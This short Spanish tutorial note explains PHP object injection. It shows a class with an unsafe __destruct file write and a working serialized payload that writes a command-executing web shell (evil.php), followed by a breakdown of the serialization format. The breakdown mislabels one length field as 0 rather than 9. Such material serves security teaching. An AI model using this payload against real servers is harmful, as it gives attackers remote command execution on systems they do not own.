    PHP Object Injection

    Código

    class foobarzoo {
    public $csv="entries.csv";
    public $line=null;

    function __destruct() {
        file_put_contents($this->csv,$this->line);
    }
}

    Payload de explotación

    data=O:9:"foobarzoo":2:{s:3:"csv";s:8:"evil.php";s:4:"line";s:28:"<?php system($_GET["cmd"])?>";}

    Donde en O:9:"foobarzoo":2:: - O → tipo de dato (objeto). - 0 → longitud dato. - 2 → cantidad de propiedades.

    Donde en s:3:"csv";s:8:"evil.php": - s → tipo de dato (string). - 3 → longitud dato. - csv → nombre de propiedad. - evil.php → valor de propiedad.
